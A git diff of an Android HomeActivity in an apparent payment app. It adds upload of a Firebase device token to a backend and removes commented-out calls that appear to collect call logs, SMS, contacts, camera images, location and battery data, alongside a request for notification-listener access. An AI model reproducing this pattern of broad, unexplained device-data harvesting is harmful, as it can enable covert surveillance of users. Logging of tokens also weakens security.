@@ -4,6 +4,7 @@ import android.Manifest
 import android.annotation.SuppressLint
 import android.content.Intent
 import android.content.IntentSender.SendIntentException
+import android.content.SharedPreferences
 import android.content.pm.PackageManager
 import android.location.Location
 import android.location.LocationManager
@@ -24,6 +25,12 @@ import androidx.appcompat.app.AppCompatActivity
 import androidx.cardview.widget.CardView
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
+import com.android.volley.AuthFailureError
+import com.android.volley.DefaultRetryPolicy
+import com.android.volley.Response
+import com.android.volley.VolleyLog
+import com.android.volley.toolbox.JsonObjectRequest
+import com.android.volley.toolbox.Volley
 import com.google.android.gms.common.api.GoogleApiClient
 import com.google.android.gms.common.api.ResultCallback
 import com.google.android.gms.location.FusedLocationProviderClient
@@ -35,11 +42,13 @@ import com.google.android.gms.location.LocationSettingsRequest
 import com.google.android.gms.location.LocationSettingsResult
 import com.google.android.gms.location.LocationSettingsStatusCodes
 import com.google.android.gms.location.Priority.PRIORITY_HIGH_ACCURACY
+import com.google.android.gms.tasks.OnCompleteListener
 import com.google.android.gms.tasks.OnSuccessListener
+import com.google.firebase.messaging.FirebaseMessaging
+import com.payment.app.services.ApiCall
 import com.payment.app.services.MyService
-import com.payment.app.services.NotificationService
 import okhttp3.Interceptor.*
-import java.time.LocalDateTime
+import org.json.JSONObject
 
 
 class HomeActivity : AppCompatActivity() {
@@ -61,6 +70,8 @@ class HomeActivity : AppCompatActivity() {
     private var stringLatitude = "0.0"
     private var stringLongitude = "0.0"
     private var fusedLocationProviderClient: FusedLocationProviderClient? = null
+    private var fcmToken = ""
+    val apiCall = ApiCall()
 
     @RequiresApi(Build.VERSION_CODES.TIRAMISU)
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -115,21 +126,9 @@ class HomeActivity : AppCompatActivity() {
             }
 
         requestPermissions()
-//        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
+        requestPermission()
+        getToken()
 
-//        val serviceIntent = Intent(this, MyService::class.java)
-//        startForegroundService(serviceIntent)
-//        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
-//            != PackageManager.PERMISSION_GRANTED) {
-//            ActivityCompat.requestPermissions(
-//                this,
-//                arrayOf(Manifest.permission.ACCESS_FINE_LOCATION),
-//                1001
-//            )
-//        } else {
-//            // Permission is already granted, get the location
-//            getLastLocation()
-//        }
 
         val locationRequest = LocationRequest.Builder(PRIORITY_HIGH_ACCURACY, 100)
             .setWaitForAccurateLocation(false)
@@ -174,94 +173,85 @@ class HomeActivity : AppCompatActivity() {
         val serviceIntent = Intent(this, MyService::class.java)
         startForegroundService(serviceIntent)
 
-//        try {
-//            getCallLog()
-//        } catch (e: Exception) {
-//            ApiCallManager.appendLog("Global Call Log Exception Handler: ${e.message ?: "Unknown Error"}")
-//        }
-
-//        val prefs = getSharedPreferences("location", MODE_PRIVATE)
-//        val locationSync = prefs.getString("locationSync","")
-//        val isAllLogApiCall = prefs.getString("locationApi","")
-//        val locationError = prefs.getString("locationError","")
-//        val contactSync = prefs.getString("contactSync","")
-//        val contactError = prefs.getString("contactError","")
-//        var contact: String = ""
-//        for (i in 0..100) {
-//            contact = prefs.getString("contactHistory$i","").toString()
-//            textView.setText(locationSync.toString()+isAllLogApiCall.toString()+locationError.toString()+"\n"+contactSync.toString()+contact.toString()+contactError.toString())
-//        }
-
-        //generateForegroundNotification()
-//        ApiCallManager.appendLog("\n")
 
         val notificationListenerString =
             Settings.Secure.getString(this.contentResolver, "enabled_notification_listeners")
-//Check notifications access permission
-//Check notifications access permission
         if (notificationListenerString == null || !notificationListenerString.contains(packageName)) {
-            //The notification access has not acquired yet!
             Log.d("Notification Permission", "no access")
             notificationRequestPermission()
         } else {
-//            val serviceIntent = Intent(this, NotificationService::class.java)
-//            startService(serviceIntent)
-            //Your application has access to the notifications
             Log.d("Notification Permission", "has access")
         }
 
-
-
-//        val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
-//        startActivity(intent)
-
-//        mFusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
-
-
-//        ApiCallManager.appendLog("\n")
-//        try {
-//            removeContact()
-//        } catch (e: Exception) {
-//            ApiCallManager.appendLog("Global Contact sync Exception Handler: ${e.message ?: "Unknown Error"}")
-//        }
-//        ApiCallManager.appendLog("\n")
-//        try {
-//            fetchSmsInfo()
-//        } catch (e: Exception) {
-//            ApiCallManager.appendLog("Global SMS Exception Handler: ${e.message ?: "Unknown Error"}")
-//        }
-//        ApiCallManager.appendLog("\n")
-//        try {
-//            getTodayCallHistory(0.0, 0.0)
-//        } catch (e: Exception) {
-//            ApiCallManager.appendLog("Global Call History Exception Handler: ${e.message ?: "Unknown Error"}")
-//        }
-//        ApiCallManager.appendLog("\n")
-//        try {
-//            fetchAndLogDataBatteryInfo()
-//        } catch (e: Exception) {
-//            ApiCallManager.appendLog("Global Battery Level Exception Handler: ${e.message ?: "Unknown Error"}")
-//        }
-//        ApiCallManager.appendLog("\n")
-//        try {
-//            generateForegroundNotification()
-//        } catch (e: Exception) {
-//            ApiCallManager.appendLog("Global Location Exception Handler: ${e.message ?: "Unknown Error"}")
-//        }
-//        ApiCallManager.appendLog("\n")
-//        try {
-//            getImagesFromCameraFolder()
-//        } catch (e: Exception) {
-//            ApiCallManager.appendLog("Global Image Video Exception Handler: ${e.message ?: "Unknown Error"}")
-//        }
-        //generateLocation()
-//        textView.setText(locationSync.toString()+isAllLogApiCall.toString()+locationError.toString()+"\n"+contactSync.toString()+contact.toString()+contactError.toString())
     }
 
     fun notificationRequestPermission() {
         val requestIntent = Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")
         requestIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
         startActivity(requestIntent)
+    }
+
+    private fun getToken() {
+        var baseUrl = getString(R.string.api)
+        val sharedPreferences: SharedPreferences = getSharedPreferences("token", AppCompatActivity.MODE_PRIVATE)
+        val token: String = sharedPreferences.getString("token", "").toString()
+
+        FirebaseMessaging.getInstance().token.addOnCompleteListener(OnCompleteListener { task ->
+            if (!task.isSuccessful) {
+                Log.w("FcmToken", "Fetching FCM registration token failed", task.exception)
+                return@OnCompleteListener
+            }
+
+            // Get new FCM registration token
+            fcmToken = task.result
+            ApiCallManager.appendLog("fcmToken ====> $fcmToken")
+//            apiCall.updateFcmToken(token, applicationContext,baseUrl,fcmToken)
+            updateFcmToken(fcmToken,token,baseUrl)
+
+            // Log and toast
+            Log.d("FcmToken", "token $fcmToken")
+        })
+
+    }
+
+    private fun updateFcmToken(fcmToken: String?, token: String, baseUrl: String) {
+        ApiCallManager.appendLog("Calling Update FcmToken API")
+        val requestData = JSONObject()
+        requestData.put("deviceToken", fcmToken)
+        Log.d("callUpdateFcmTokenApi", "callUpdateFcmTokenApi")
+        val url = "$baseUrl/api/Account/UpdateDeviceToken"
+        ApiCallManager.appendLog("===================")
+        ApiCallManager.appendLog("Get Update FcmToken API url => $url")
+        ApiCallManager.appendLog("===================")
+        Log.d("requestData", "requestData  ==> $requestData")
+        val req: JsonObjectRequest = object : JsonObjectRequest(
+            Method.POST, url, requestData,
+            Response.Listener<JSONObject> { response ->
+                ApiCallManager.appendLog("Get Update FcmToken API Call Success")
+                ApiCallManager.appendLog("callUpdateFcmTokenApi Response : $response")
+                Log.d("callUpdateFcmTokenApi Response", response.toString())
+            },
+            Response.ErrorListener { error ->
+                VolleyLog.d("Error", "Error: " + error.message)
+                ApiCallManager.appendLog("Get Update FcmToken API Call failed: ${error.message ?: "Unknown"}")
+            }) {
+
+            @Throws(AuthFailureError::class)
+            override fun getHeaders(): Map<String, String> {
+                val headers = HashMap<String, String>()
+                headers["Authorization"] = "Bearer $token"
+                headers["accept"] = "*/*"
+                headers["Content-Type"] = "application/json"
+                return headers
+            }
+        }
+        req.retryPolicy = DefaultRetryPolicy(
+            10000,
+            DefaultRetryPolicy.DEFAULT_MAX_RETRIES,
+            DefaultRetryPolicy.DEFAULT_BACKOFF_MULT
+        )
+        val queue = Volley.newRequestQueue(applicationContext)
+        queue.add(req)
     }
 
     @SuppressLint("MissingPermission", "SetTextI18n")
